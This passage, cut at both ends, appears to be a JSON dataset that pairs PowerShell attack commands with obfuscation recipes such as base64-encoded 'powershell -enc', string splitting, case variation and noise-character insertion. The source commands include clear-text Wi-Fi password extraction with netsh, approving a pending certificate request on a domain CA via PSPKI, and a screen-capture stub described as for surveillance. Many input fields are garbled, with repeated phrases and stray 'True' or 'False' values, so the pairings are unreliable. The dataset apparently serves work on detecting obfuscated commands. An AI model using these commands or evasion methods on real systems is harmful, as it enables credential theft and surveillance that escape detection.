    "input": "Use PSPKI module to approve the request",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
    "input": "Use PSPKI module to approve the request",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
    "input": "Use PSPKI module to approve the request",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
    "input": "Use PSPKI module to approve the request",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
    "input": "Use PSPKI module to approve the request",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
    "input": "Restart WinRM",
    "output": "Restart-Service WinRM",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": ": Restart WinRM: Restart WinRM: Start winRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": ": Restart WinRM: Restart WinRM. Copy: Unparaphrase: Restart WinRM.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": ": In paraphrase: Restart WinRM: Restart WinRM, Restart WinRM, Restart WinRM - Restart WinRM-Anwendung Restart WinRM-Board, Restart WinRM-Board. Paraphrase: Restart WinRM - Restart WinRM-Board",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": "Restart WinRM",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": ": Restart WinRM: Restart WinRM: Start winRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": ": Restart WinRM: Restart WinRM. Copy: Unparaphrase: Restart WinRM.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": ": In paraphrase: Restart WinRM: Restart WinRM, Restart WinRM, Restart WinRM - Restart WinRM-Anwendung Restart WinRM-Board, Restart WinRM-Board. Paraphrase: Restart WinRM - Restart WinRM-Board",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": "Restart WinRM",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": ": Restart WinRM: Restart WinRM: Start winRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": ": Restart WinRM: Restart WinRM. Copy: Unparaphrase: Restart WinRM.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": ": In paraphrase: Restart WinRM: Restart WinRM, Restart WinRM, Restart WinRM - Restart WinRM-Anwendung Restart WinRM-Board, Restart WinRM-Board. Paraphrase: Restart WinRM - Restart WinRM-Board",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": "Restart WinRM",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": ": Restart WinRM: Restart WinRM: Start winRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart WinRM: Restart",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": ": Restart WinRM: Restart WinRM. Copy: Unparaphrase: Restart WinRM.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": ": In paraphrase: Restart WinRM: Restart WinRM, Restart WinRM, Restart WinRM - Restart WinRM-Anwendung Restart WinRM-Board, Restart WinRM-Board. Paraphrase: Restart WinRM - Restart WinRM-Board",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Restart WinRM",
    "origin_cmd": "Restart-Service WinRM"
  },
  {
    "input": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "output": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "True",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "True",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "True",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "True",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Wi-Fi Profiles and Passwords, Extracts Wi-Fi network profiles and their associated passwords stored on the system.",
    "origin_cmd": "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }"
  },
  {
    "input": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "output": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  },
  {
    "input": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  },
  {
    "input": "True",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  },
  {
    "input": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  },
  {
    "input": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  },
  {
    "input": "True",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  },
  {
    "input": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  },
  {
    "input": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  },
  {
    "input": "True",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
